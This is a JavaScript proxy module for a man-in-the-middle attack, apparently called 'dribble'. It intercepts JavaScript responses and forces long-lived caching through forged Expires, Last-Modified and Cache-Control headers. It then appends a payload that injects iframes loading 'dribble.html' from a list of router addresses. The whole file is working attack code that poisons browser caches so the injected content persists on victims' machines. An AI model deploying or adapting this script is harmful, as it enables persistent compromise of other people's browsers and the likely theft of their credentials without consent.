var is_router = false;
var host = "NONE";
var routers =${r}

function onResponse(req, res) {
    if( req.Hostname != "dribble.poison" && res.ContentType.indexOf('application/javascript') == 0 ){
	//console.log("caching");
	//console.log(req.Hostname)
        var body = res.ReadBody();
	// set caching header
	res.SetHeader("Cache-Control","max-age=86400");
	res.SetHeader("Content-Type","text/html");
	res.SetHeader("Cache-Control","public, max-age=99936000");
	res.SetHeader("Expires","Wed, 2 Nov 2050 10:00:00 GMT");
	res.SetHeader("Last-Modified","Wed, 2 Nov 1988 10:00:00 GMT");
	res.SetHeader("Access-Control-Allow-Origin:","*");

	// set payload
	var payload = "document.addEventListener(\"DOMContentLoaded\", function(event){\n";
	for(var i=0; i < routers.length; i++){
		payload = payload + "var ifrm = document.createElement('iframe');\nifrm.setAttribute('src', 'http://"+routers[i]+"/dribble.html');ifrm.style.width = '640px';ifrm.style.height = '480px';\ndocument.body.appendChild(ifrm);\n";
		//console.log(routers[i]);
	}
	payload = payload + "});";
	res.Body = body + payload;

    }
}

